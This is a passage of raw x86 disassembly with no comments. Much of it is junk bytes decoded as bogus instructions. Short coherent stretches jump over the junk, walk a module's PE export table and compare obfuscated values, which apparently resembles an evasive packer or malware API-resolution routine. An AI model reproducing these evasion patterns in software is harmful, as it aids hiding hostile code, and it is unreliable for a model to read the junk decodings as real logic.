  4020cd:	jo     0x402107
  4020cf:	inc    esi
  4020d0:	pop    ds
  4020d1:	jecxz  0x40212a
  4020d3:	aad    0x1d
  4020d5:	(bad)  
  4020d6:	(bad)  
  4020d7:	fcom   QWORD PTR [esi+0x58]
  4020da:	enter  0x7eda,0x84
  4020de:	sti    
  4020df:	ins    DWORD PTR es:[edi],dx
  4020e0:	and    edi,DWORD PTR ds:0xaec41d0d
  4020e6:	sbb    edx,esi
  4020e8:	jp     0x402107
  4020ea:	sub    esp,DWORD PTR [esi]
  4020ec:	cdq    
  4020ed:	xchg   edi,eax
  4020ee:	mov    dh,0xca
  4020f0:	jbe    0x4020ed
  4020f2:	push   ecx
  4020f3:	xchg   BYTE PTR [eax+0x57ce89d6],ch
  4020f9:	ret    
  4020fa:	icebp  
  4020fb:	(bad)  
  4020fd:	cmp    BYTE PTR [edx+ebx*1],dl
  402100:	ss cmp al,0xef
  402103:	push   ds
  402104:	shl    BYTE PTR [ebp+0x7ee8cdae],cl
  40210a:	mov    ds:0x42762854,eax
  40210f:	cwde   
  402110:	sub    DWORD PTR [edx],ebx
  402112:	rcl    BYTE PTR ds:0x7061ef,1
  402118:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40211a:	les    esi,FWORD PTR [edx-0x374fc4e4]
  402120:	fs (bad) 
  402122:	jmp    0x5b01cd24
  402127:	dec    ebx
  402128:	mov    edi,0x5625c7ef
  40212d:	jecxz  0x402183
  40212f:	in     al,dx
  402130:	jnp    0x4020be
  402132:	fs inc ebx
  402134:	xor    eax,0xaa88b500
  402139:	mov    eax,0xd21edcb8
  40213e:	(bad)  
  40213f:	(bad)  
  402141:	push   esp
  402142:	and    al,0x3f
  402144:	(bad)  
  402146:	cdq    
  402147:	ins    DWORD PTR es:[edi],dx
  402148:	pop    es
  402149:	jge    0x402133
  40214b:	stc    
  40214c:	sub    BYTE PTR [edi],dh
  40214e:	push   esi
  40214f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402150:	scas   eax,DWORD PTR es:[edi]
  402151:	mov    dl,0xd9
  402153:	mov    esi,0xdf547d22
  402158:	cmp    ebx,DWORD PTR [eax-0x50]
  40215b:	cmp    DWORD PTR [ebx-0x359d76c6],ebp
  402161:	xor    BYTE PTR [ebp-0x13],bh
  402164:	addr16 adc al,0x7f
  402167:	inc    eax
  402168:	out    0x1e,al
  40216a:	push   ebp
  40216b:	(bad)  
  40216c:	imul   ebp,DWORD PTR [ebp-0x3c],0x4f
  402170:	jae    0x402117
  402172:	sar    DWORD PTR [esi-0x61],0x59
  402176:	xor    ecx,DWORD PTR [eax]
  402178:	sbb    DWORD PTR [ebx-0x44],ebp
  40217b:	jmp    0x4021c3
  40217d:	xor    al,0xa2
  40217f:	mov    esi,0x3ea9b990
  402184:	outs   dx,DWORD PTR ds:[esi]
  402185:	sbb    ebx,ecx
  402187:	mov    esp,0x9e398e9f
  40218c:	jno    0x4021e7
  40218e:	cmp    DWORD PTR [ebx-0xe],edx
  402191:	mov    DWORD PTR [ecx],ebp
  402193:	lods   eax,DWORD PTR ds:[esi]
  402194:	sub    DWORD PTR [ebx-0x6],esi
  402197:	dec    ebp
  402198:	or     dh,BYTE PTR [edx-0x6d19f6a0]
  40219e:	jb     0x4021fb
  4021a0:	ins    BYTE PTR es:[edi],dx
  4021a1:	mov    BYTE PTR [edi+ecx*2],dl
  4021a4:	scas   al,BYTE PTR es:[edi]
  4021a5:	ss adc ch,dh
  4021a8:	int    0x8f
  4021aa:	xor    DWORD PTR [edx+0x7d],eax
  4021ad:	jno    0x4021e0
  4021af:	pop    es
  4021b0:	pop    ss
  4021b1:	or     al,al
  4021b3:	jne    0x4021e0
  4021b5:	les    esp,FWORD PTR [edx+0x11]
  4021b8:	call   0x1bc2aa7d
  4021bd:	inc    edx
  4021be:	in     eax,0x6a
  4021c0:	pusha  
  4021c1:	inc    ebp
  4021c2:	mov    ds:0x210adaf,eax
  4021c7:	sahf   
  4021c8:	test   eax,0x3f031f39
  4021cd:	mov    ebx,0x36474f38
  4021d2:	jg     0x402216
  4021d4:	out    0xe2,eax
  4021d6:	pop    edx
  4021d7:	jge    0x402160
  4021d9:	jmp    0x8a5f:0xf6b00f98
  4021e0:	mov    ds:0x18a05bfa,eax
  4021e5:	mov    ch,0xa5
  4021e7:	es and al,0x53
  4021ea:	jmp    0x4021a4
  4021ec:	mov    esi,0x7d2c3351
  4021f1:	or     BYTE PTR [ebx],al
  4021f3:	cld    
  4021f4:	cmp    bh,0x56
  4021f7:	sahf   
  4021f8:	loope  0x4021a5
  4021fa:	jl     0x402198
  4021fc:	inc    esp
  4021fd:	fist   WORD PTR fs:[eax+0x75]
  402201:	xchg   ebp,eax
  402202:	sub    al,0x1b
  402204:	inc    edi
  402205:	jbe    0x402198
  402207:	pop    edx
  402208:	(bad)  
  402209:	push   ebp
  40220a:	fsubr  QWORD PTR [eax]
  40220c:	aaa    
  40220d:	fdivr  QWORD PTR [eax+edi*1-0x12]
  402211:	mov    cl,BYTE PTR [eax]
  402213:	sbb    al,0x44
  402215:	jne    0x4021c6
  402217:	xchg   ecx,eax
  402218:	jbe    0x402269
  40221a:	jbe    0x402273
  40221c:	mov    dh,0x12
  40221e:	pop    edx
  40221f:	arpl   WORD PTR [edi],si
  402221:	sbb    ebp,DWORD PTR [esi-0x18d71454]
  402227:	mov    ch,0x8
  402229:	ror    BYTE PTR [eax],1
  40222b:	or     ebp,DWORD PTR [eax]
  40222d:	mov    al,0x87
  40222f:	xchg   ebx,eax
  402230:	ins    BYTE PTR es:[edi],dx
  402231:	add    edi,DWORD PTR [eax+0x4d43fd94]
  402237:	lahf   
  402238:	xor    BYTE PTR [ecx],al
  40223a:	test   al,0x64
  40223c:	fbld   TBYTE PTR [esi]
  40223e:	ror    BYTE PTR [esi],cl
  402240:	sub    eax,0x1452db8b
  402245:	sbb    eax,0x64746a26
  40224a:	(bad)  
  40224b:	(bad)  
  40224c:	dec    eax
  40224d:	rcl    BYTE PTR [ecx],1
  40224f:	ja     0x40220c
  402251:	int    0x61
  402253:	xor    esi,eax
  402255:	sub    BYTE PTR [ebx],cl
  402257:	fstp   QWORD PTR [eax]
  402259:	cmp    ch,0xba
  40225c:	push   ebx
  40225d:	in     al,0x54
  40225f:	push   ss
  402260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402261:	in     al,0xe8
  402263:	daa    
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	cmpxchg BYTE PTR [ebp+0x3b6fb53],dh
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	scas   al,BYTE PTR es:[edi]
  4022d7:	mov    bh,0xd5
  4022d9:	add    al,0x41
  4022db:	mov    cl,0x97
  4022dd:	dec    ecx
  4022de:	fs pop ebx
  4022e0:	and    al,0xb9
  4022e2:	hlt    
  4022e3:	fdiv   QWORD PTR [ebp-0x25]
  4022e6:	jge    0x4022c4
  4022e8:	push   0x6a
  4022ea:	imul   ebp,ebp,0xe708eb0
  4022f0:	mov    ds:0x6bb250c,al
  4022f5:	mov    dl,0x74
  4022f7:	and    eax,0x8fa7e6a9
  4022fc:	(bad)  
  4022fd:	fsubr  DWORD PTR [ebp+0x5a582a8]
  402303:	cmp    ah,cl
  402305:	test   al,ch
  402307:	sub    DWORD PTR [eax+0x4e],esi
  40230a:	ror    DWORD PTR [ebp+0x77],0xc0
  40230e:	das    
  40230f:	pop    es
  402310:	pop    esp
  402311:	dec    ecx
  402312:	cmc    
  402313:	sub    DWORD PTR [eax+0x30554fb2],0xe7d42566
  40231d:	mov    DWORD PTR ss:[edi],ebx
  402320:	inc    ebp
  402321:	adc    DWORD PTR [edi-0x80df805],ecx
  402327:	test   ebx,0xffe96230
  40232d:	test   al,0xe3
  40232f:	out    dx,eax
  402330:	pop    ds
  402331:	retf   
  402332:	and    BYTE PTR [ebp+0x44],dl
  402335:	jns    0x402366
  402337:	rcl    esi,0xe5
  40233a:	mov    al,ds:0x287c551
  40233f:	sub    DWORD PTR [ebx+0x2d96a8df],0xffffffaf
  402346:	jl     0x402377
  402348:	pop    ss
  402349:	jne    0x402392
  40234b:	dec    edi
  40234c:	push   edi
  40234d:	js     0x4023a9
  40234f:	test   DWORD PTR [edi-0x6a],ebx
  402352:	inc    edx
  402353:	mov    ecx,0x8c6132e
  402358:	add    BYTE PTR [eax+0x34],dl
  40235b:	sub    al,0x4f
  40235d:	sbb    dh,BYTE PTR [eax-0x1e]
  402360:	repz mov ?,edi
  402363:	jae    0x40230a
  402365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402366:	sbb    eax,0x27503e72
  40236b:	mov    eax,ds:0xb18659cb
  402370:	sbb    ebp,DWORD PTR [edi-0x1c]
  402373:	adc    ah,BYTE PTR [eax-0x8902ca3]
  402379:	ja     0x40233f
  40237b:	xchg   edi,eax
  40237c:	and    eax,0x8f8f4126
  402381:	aad    0xb5
  402383:	pop    esi
  402384:	out    dx,al
  402385:	sub    al,BYTE PTR [esi]
  402387:	(bad)  [esi+eax*1+0x56]
  40238b:	(bad)  
  40238c:	push   0xffffffb1
  40238e:	sub    eax,0x851608b3
  402393:	pop    es
  402394:	adc    DWORD PTR [ecx],ebx
  402396:	add    ch,BYTE PTR [ebp+0x3a]
  402399:	clc    
  40239a:	out    dx,al
  40239b:	jns    0x4023b1
  40239d:	push   edx
  40239e:	lahf   
  40239f:	sub    al,0x5
  4023a1:	push   ecx
  4023a2:	xor    eax,0xaaf4ec52
  4023a7:	loop   0x4023ad
  4023a9:	shl    BYTE PTR [esi+0x19],1
  4023ac:	xor    dh,ah
  4023ae:	xlat   BYTE PTR ds:[ebx]
  4023af:	or     dh,0x0
  4023b2:	call   0xcac05b57
  4023b7:	iret   
  4023b8:	imul   eax,DWORD PTR [esi],0xb8d0c966
  4023be:	mov    dl,0x4a
  4023c0:	(bad)  [edx]
  4023c2:	inc    edi
  4023c3:	lds    ecx,FWORD PTR [esi+0x6e]
  4023c6:	mov    al,ds:0x59e398ef
  4023cb:	jl     0x4023d3
  4023cd:	das    
  4023ce:	(bad)  
  4023d0:	and    DWORD PTR gs:[ebx-0x20],eax
  4023d4:	mov    al,0xcb
  4023d6:	add    ecx,eax
  4023d8:	sbb    eax,0xecc74374
  4023dd:	cld    
  4023de:	aas    
  4023df:	(bad)  
  4023e0:	xlat   BYTE PTR ds:[ebx]
  4023e1:	adc    eax,0xbc925317
  4023e6:	jmp    0x96a4:0xbd3f8a34
  4023ed:	mov    al,ds:0xe1cb127f
  4023f2:	div    ah
  4023f4:	enter  0x6059,0xd0
  4023f8:	or     BYTE PTR [edx+ebx*1+0x54],ah
  4023fc:	mov    esp,0xac72fa76
  402401:	inc    eax
  402402:	je     0x402431
  402404:	mov    BYTE PTR es:[edi],0xfd
  402408:	jns    0x4023da
  40240a:	popf   
  40240b:	adc    eax,0xc308736b
  402410:	test   eax,0x77310028
  402415:	jecxz  0x402409
  402417:	xchg   edx,eax
  402418:	mov    ecx,0xfc19414a
  40241d:	jmp    0x40244f
  40241f:	ins    BYTE PTR es:[edi],dx
  402420:	mov    eax,ds:0x778d5e9b
  402425:	loope  0x4023d0
  402427:	out    0x72,al
  402429:	ins    DWORD PTR es:[edi],dx
  40242a:	xchg   ebp,eax
  40242b:	adc    ch,0xac
  40242e:	iret   
  40242f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402430:	mov    bl,dh
  402432:	in     eax,0x1
  402434:	push   ss
  402435:	cmp    ebx,DWORD PTR [eax]
  402437:	jnp    0x402499
  402439:	(bad)  
  40243a:	call   0x42bc1791
  40243f:	pushf  
  402440:	sbb    bh,al
  402442:	xor    eax,0xbd2886a4
  402447:	sar    DWORD PTR cs:[ecx-0x5f76a2a4],cl
  40244e:	dec    ebp
  40244f:	in     eax,0x11
  402451:	xor    ecx,DWORD PTR [esi-0x44]
  402454:	xor    eax,0xdb132114
  402459:	mov    cl,0xc5
  40245b:	lea    ebx,[esi]
  40245d:	adc    BYTE PTR [ecx],al
  40245f:	enter  0x5467,0x43
  402463:	icebp  
  402464:	push   esi
  402465:	into   
  402466:	scas   al,BYTE PTR es:[edi]
  402467:	mov    ecx,ebx
  402469:	mov    ds:0x83f3876d,al
  40246e:	les    esp,FWORD PTR [ebx+eiz*2+0x28]
  402472:	rcl    DWORD PTR [edi+0x15],0x1b
  402476:	adc    BYTE PTR [ecx+esi*2],dl
  402479:	rcr    BYTE PTR [eax+ebp*1-0x78d6a00b],cl
  402480:	out    0xfe,eax
  402482:	retf   0x7819
  402485:	fwait
  402486:	or     edi,DWORD PTR [esi+edx*4-0x61]
  40248a:	ja     0x4024ea
  40248c:	cdq    
  40248d:	mov    ecx,DWORD PTR [ebp-0x8]
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xf5d54960
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	jo     0x40252e
  4024db:	or     eax,0x843c04e7
  4024e0:	dec    edx
  4024e1:	in     eax,dx
  4024e2:	call   0x6954:0x6dcd1ee4
  4024e9:	and    bh,BYTE PTR [ecx]
  4024eb:	mov    eax,ds:0x47da219
  4024f0:	adc    al,0x74
  4024f2:	ja     0x402564
  4024f4:	div    ch
  4024f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024f7:	lods   eax,DWORD PTR ds:[esi]
  4024f8:	sub    esi,DWORD PTR [edx+0x41b89bf9]
  4024fe:	ds push eax
  402500:	call   DWORD PTR [esi+0x67]
  402503:	pop    ebx
  402504:	dec    ebx
  402505:	mov    al,0x74
  402507:	and    bh,BYTE PTR [edx]
  402509:	add    ecx,DWORD PTR [edx]
  40250b:	test   DWORD PTR [edx+0x516c9756],ecx
  402511:	lods   al,BYTE PTR ds:[esi]
  402512:	das    
  402513:	pop    esi
  402514:	ins    BYTE PTR es:[edi],dx
  402515:	out    dx,al
  402516:	aam    0x61
  402518:	addr16 mov al,0x75
  40251b:	mov    ah,0x9a
  40251d:	mov    ebx,0xba47d0d9
  402522:	push   ds
  402523:	rol    ebx,1
  402525:	mov    dl,0xe2
  402527:	inc    esi
  402528:	mov    ecx,0xe7fd1abe
  40252d:	fdivp  st(1),st
  40252f:	loopne 0x40254b
  402531:	mov    ah,0x83
  402533:	pop    ecx
  402534:	inc    esi
  402535:	not    DWORD PTR [ebp-0x3d22feba]
  40253b:	sar    DWORD PTR [edx+0x13],cl
  40253e:	mov    es,WORD PTR ds:0x5862d216
  402545:	shr    ebp,0xfd
  402548:	int    0xa1
  40254a:	xchg   ebp,eax
  40254b:	dec    esi
  40254c:	pop    es
  40254d:	dec    ebx
  40254e:	ja     0x4024f7
  402550:	adc    dh,BYTE PTR [edx]
  402552:	lahf   
  402553:	rol    DWORD PTR [esi-0x26d09eca],cl
  402559:	ret    0x13b1
  40255c:	sbb    edi,DWORD PTR [eax+0x1d9a7836]
  402562:	dec    ebx
  402563:	gs dec edx
  402566:	retf   0xa7ac
  402569:	and    ebp,0x9
  40256c:	mov    edi,0x764f4304
  402571:	xchg   DWORD PTR [eax-0x79],edi
  402574:	ficomp DWORD PTR [ebx+esi*4]
  402577:	xchg   ecx,eax
  402578:	push   ecx
  402579:	sub    dh,BYTE PTR [ecx+edx*1]
  40257c:	jae    0x4025ea
  40257e:	mov    edx,0xb2d65e75
  402583:	sub    esi,DWORD PTR [eax-0x1b3759df]
  402589:	pop    ebp
  40258a:	or     esi,edx
  40258c:	sub    eax,0x48b5a4d0
  402591:	cmp    BYTE PTR [ebp+edi*8+0x48451bb4],dh
  402598:	pop    esp
  402599:	push   ss
  40259a:	aam    0x9
  40259c:	sar    DWORD PTR [ecx],0xd0
  40259f:	adc    al,0x28
  4025a1:	in     al,dx
  4025a2:	or     bh,al
  4025a4:	out    dx,eax
  4025a5:	stos   DWORD PTR es:[edi],eax
  4025a6:	les    edi,FWORD PTR [edx+0x53ea472a]
  4025ac:	scas   eax,DWORD PTR es:[edi]
  4025ad:	sbb    eax,DWORD PTR [esi]
  4025af:	and    edx,DWORD PTR [ebx+0x55e2859f]
  4025b5:	inc    esp
  4025b6:	loopne 0x402579
  4025b8:	aaa    
  4025b9:	sar    DWORD PTR [eax-0x65a59c29],cl
  4025bf:	fsub   QWORD PTR [ecx]
  4025c1:	jo     0x4025d3
  4025c3:	jno    0x40260d
  4025c5:	sti    
  4025c6:	in     al,0xbe
  4025c8:	jmp    0xc7a9c078
  4025cd:	cmp    ecx,DWORD PTR [ebx-0x6a]
  4025d0:	pop    ebx
  4025d1:	push   DWORD PTR [ebp-0x722efc86]
  4025d7:	mov    esp,0x17e15f7b
  4025dc:	mov    ah,0xc8
  4025de:	cmp    ecx,DWORD PTR [edi-0x66]
  4025e1:	sub    DWORD PTR [edi-0x143bc247],esp
  4025e7:	jno    0x4025d8
  4025e9:	push   ebx
  4025ea:	cmp    DWORD PTR ds:0xfd3f74fc,ecx
  4025f0:	mov    ebp,0x1a2ed9c6
  4025f5:	cmp    DWORD PTR [ebp-0x460923ea],0x34499667
  4025ff:	lods   eax,DWORD PTR ds:[esi]
  402600:	call   0x9f4e:0x8f5adfbc
  402607:	push   edi
  402608:	shl    BYTE PTR [eax-0x79],0x27
  40260c:	pushf  
  40260d:	add    eax,0x67ccbd10
  402612:	shl    BYTE PTR [ebx+ebp*4+0x12],0xad
  402617:	jns    0x4025a7
  402619:	cmp    bh,BYTE PTR [edi+0x65]
  40261c:	jg     0x402676
  40261e:	sar    DWORD PTR [esi],1
  402620:	jle    0x402660
  402622:	fmul   DWORD PTR [esi-0x5a2d55d5]
  402628:	mov    ds:0x44a1f918,eax
  40262d:	dec    edx
  40262e:	and    edi,0x7e51d758
  402634:	scas   al,BYTE PTR es:[edi]
  402635:	or     al,0x79
  402637:	cmp    cl,BYTE PTR [edx]
  402639:	retf   
  40263a:	adc    eax,0xa9bbdc29
  40263f:	add    eax,0x48595049
  402644:	xchg   ebx,eax
  402645:	daa    
  402646:	lods   eax,DWORD PTR ds:[esi]
  402647:	pop    esp
  402648:	ror    DWORD PTR [ebp-0x50],1
  40264b:	mov    ah,0x94
  40264d:	xor    eax,0x8f2340c4
  402652:	xor    esp,DWORD PTR [esi+0x63]
  402655:	push   es
  402656:	mov    edx,0x59df01cc
  40265b:	sbb    DWORD PTR [esi+0x70e034b6],eax
  402661:	cmp    ebp,ebp
  402663:	lods   al,BYTE PTR ds:[esi]
  402664:	iret   
  402665:	jne    0x40265e
  402667:	push   ss
  402668:	push   ss
  402669:	inc    esi
  40266a:	shr    DWORD PTR [ecx],1
  40266c:	mov    dl,0x9d
  40266e:	sub    al,0xc7
  402670:	in     eax,dx
  402671:	dec    ebp
  402672:	inc    ebp
  402673:	test   eax,0x4136f54c
  402678:	cmovns ebx,DWORD PTR ds:[esi-0x6e4680ce]
  402680:	je     0x40267d
  402682:	(bad)  
  402684:	clc    
  402685:	data16 fcom QWORD PTR ds:0x5149795c
  40268c:	repz sbb esi,edi
  40268f:	mov    ecx,0x8be04d89
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x31
  4026c9:	xor    ebx,DWORD PTR [ebx+0x67]
  4026cc:	and    al,0xf
  4026ce:	jle    0x40274e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	clc    
  4026d5:	ret    0xf00
  4026d8:	jg     0x402665
  4026da:	sub    BYTE PTR [edx+0x18],0x93
  4026de:	lsl    eax,WORD PTR [edx-0x20]
  4026e2:	lods   eax,DWORD PTR ds:[si]
  4026e4:	mov    esp,0xf4e46dab
  4026e9:	leave  
  4026ea:	and    edi,DWORD PTR [edi-0x62225943]
  4026f0:	push   ebp
  4026f1:	pop    ds
  4026f2:	mov    ah,0x6a
  4026f4:	push   edx
  4026f5:	into   
  4026f6:	cmp    eax,0x4b5b7ef
  4026fb:	mov    ?,WORD PTR [edx+0x7ba3aa86]
  402701:	dec    eax
  402702:	jno    0x4026d3
  402704:	mov    dh,0xc1
  402706:	shl    BYTE PTR [ebx],1
  402708:	fadd   DWORD PTR [esp+esi*2]
  40270b:	es (bad) 
  40270d:	adc    BYTE PTR gs:[ecx-0x39],dl
  402711:	or     edi,edx
  402713:	rcr    BYTE PTR [ebp-0x62],1
  402716:	inc    eax
  402717:	xor    BYTE PTR [esi],bl
  402719:	mov    cl,0xcf
  40271b:	rcr    DWORD PTR [esi],1
  40271d:	ja     0x4026d3
  40271f:	mov    ebp,0x53a08032
  402724:	stc    
  402725:	in     al,0x7
  402727:	repz pop ebx
  402729:	ja     0x40272e
  40272b:	test   DWORD PTR [ecx],esi
  40272d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40272e:	lea    ecx,ds:0x9e193672
  402734:	xchg   ebx,eax
  402735:	icebp  
  402736:	xor    ecx,DWORD PTR [eax+0x70c5a4b3]
  40273c:	sbb    ebp,DWORD PTR [ebx]
  40273e:	adc    eax,ebp
  402740:	jg     0x402718
  402742:	mov    dl,0xaf
  402744:	sbb    BYTE PTR [ecx-0x22],cl
  402747:	in     al,0x4b
  402749:	inc    esp
  40274a:	sub    esi,DWORD PTR [ebx]
  40274c:	sbb    eax,0x5f0b4747
  402751:	in     eax,0x8e
  402753:	jecxz  0x402748
  402755:	xchg   DWORD PTR [ebx],eax
  402757:	push   edx
  402758:	sbb    dl,BYTE PTR [ecx]
  40275a:	fidiv  DWORD PTR [edi-0x7e]
  40275d:	ret    0xf9a3
  402760:	pop    ss
  402761:	mov    esp,0xdbb5e9c1
  402766:	out    dx,al
  402767:	in     al,0xdd
  402769:	dec    esp
  40276a:	xchg   esi,eax
  40276b:	push   cs
  40276c:	push   ebp
  40276d:	mov    ebx,0xb2c9041f
  402772:	mov    ds:0x4edd0673,al
  402777:	add    edx,DWORD PTR [ebx+0x1e]
  40277a:	cdq    
  40277b:	inc    edi
  40277c:	or     al,0xf7
  40277e:	jne    0x4027be
  402780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402781:	push   0x59
  402783:	cmp    eax,0x8b8ac602
  402788:	jge    0x40270e
  40278a:	fs jne 0xd4864c39
  402791:	jle    0x402722
  402793:	and    BYTE PTR [edi],al
  402795:	adc    dh,BYTE PTR [ecx+0x3b1964ae]
  40279b:	cdq    
  40279c:	fs ffreep st(7)
  40279f:	add    bh,BYTE PTR [edx-0x17]
  4027a2:	aas    
  4027a3:	scas   al,BYTE PTR es:[edi]
  4027a4:	xchg   esi,eax
  4027a5:	mov    ds,WORD PTR [ebx+ebp*4+0x63]
  4027a9:	rcl    BYTE PTR [esi+0x53],1
  4027ac:	pop    ss
  4027ad:	and    al,0x61
  4027af:	or     al,cl
  4027b1:	enter  0x5d0d,0xce
  4027b5:	push   ss
  4027b6:	cmp    edi,ebx
  4027b8:	jecxz  0x4027a4
  4027ba:	lds    esi,FWORD PTR [ebp+0x1ed9eb36]
  4027c0:	sbb    DWORD PTR [ecx+eiz*1+0x6b3ae7f],ebp
  4027c7:	aam    0xa4
  4027c9:	(bad)  
  4027cb:	sub    cl,cl
  4027cd:	xor    BYTE PTR [eax+0x53339e74],dl
  4027d3:	add    al,0xc
  4027d5:	mov    eax,ds:0x54cd1b3b
  4027da:	sbb    eax,ebp
  4027dc:	adc    bh,dh
  4027de:	frstor [eax-0x7d]
  4027e1:	dec    edx
  4027e2:	push   esi
  4027e3:	loop   0x4027fe
  4027e5:	popf   
  4027e6:	ret    
  4027e7:	sub    DWORD PTR [ebx+0x6a],ebp
  4027ea:	test   DWORD PTR [edx],ecx
  4027ec:	sahf   
  4027ed:	cmp    BYTE PTR [ebp-0x6],dl
  4027f0:	cmp    eax,0x2a2d5ae2
  4027f5:	hlt    
  4027f6:	les    edi,FWORD PTR fs:[esi+eax*8]
  4027fa:	adc    dh,BYTE PTR ds:0x81b6cfa4
  402800:	jno    0x402843
  402802:	fnstsw WORD PTR [ecx-0x1d]
  402805:	cld    
  402806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402807:	into   
  402808:	or     BYTE PTR [eax-0x7005f21e],bh
  40280e:	psubw  mm5,QWORD PTR [ebx-0x6d64815e]
  402815:	sbb    bl,BYTE PTR [eax-0x696ed28c]
  40281b:	rcl    DWORD PTR [esi],0x62
  40281e:	fdivr  DWORD PTR [ecx+0x42]
  402821:	xchg   esp,eax
  402822:	ja     0x40285e
  402824:	and    BYTE PTR [esi+0x70b092fd],ch
  40282a:	mov    al,0xa7
  40282c:	or     bl,BYTE PTR [ebx-0x54]
  40282f:	or     al,0xb1
  402831:	fldcw  WORD PTR [esp+ecx*2-0x7a]
  402835:	add    eax,0x6e02deb5
  40283a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283b:	adc    BYTE PTR [ecx-0xf],dh
  40283e:	mov    edi,0xd2692938
  402843:	push   0xd04d3629
  402848:	daa    
  402849:	sub    dl,ah
  40284b:	mov    esp,0x6a795d98
  402850:	shl    dl,cl
  402852:	and    esi,DWORD PTR [ebx-0x18]
  402855:	sbb    ecx,DWORD PTR [eax+0x8bb8a8a]
  40285b:	popf   
  40285c:	or     ch,BYTE PTR [edx+0x62]
  40285f:	cmc    
  402860:	xchg   bl,al
  402862:	xchg   esp,eax
  402863:	cwde   
  402864:	jg     0x40284a
  402866:	mov    ebp,0x17046b0a
  40286b:	mov    ah,0x52
  40286d:	push   0xfffffff2
  40286f:	aas    
  402870:	ins    DWORD PTR es:[edi],dx
  402871:	cs push ecx
  402873:	mov    bh,0x85
  402875:	outs   dx,DWORD PTR ds:[esi]
  402876:	pop    es
  402877:	mov    edx,0x37a01534
  40287c:	cmp    DWORD PTR [eax+0x46c09295],ebx
  402882:	(bad)
  402885:	jge    0x402833
  402887:	iret   
  402888:	ss ins BYTE PTR es:[edi],dx
  40288a:	and    cl,BYTE PTR [ecx+0x24e901]
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
